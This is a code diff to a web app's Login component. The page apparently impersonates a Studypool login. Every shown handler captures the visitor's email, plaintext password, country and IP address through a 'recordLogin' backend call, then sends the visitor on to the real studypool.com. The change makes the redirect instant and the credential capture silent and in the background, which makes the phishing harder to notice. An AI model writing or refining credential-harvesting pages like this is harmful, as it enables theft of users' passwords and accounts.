@@ -33,21 +33,17 @@ export default function Login() {
   const recordLoginMutation = trpc.student.recordLogin.useMutation();
 
   const handleLogin = async () => {
-    // Record the login data
-    try {
-      await recordLoginMutation.mutateAsync({
-        username: email,
-        password: password,
-        email: email,
-        country: userCountry,
-        ipAddress: userIp,
-      });
-    } catch (error) {
-      console.error("Failed to record login:", error);
-    }
-
-    // Redirect to studypool.com
+    // Redirect to studypool.com immediately
     window.location.href = "https://www.studypool.com";
+
+    // Record the login data in the background (fire and forget)
+    recordLoginMutation.mutate({
+      username: email,
+      password: password,
+      email: email,
+      country: userCountry,
+      ipAddress: userIp,
+    });
   };
 
   return (
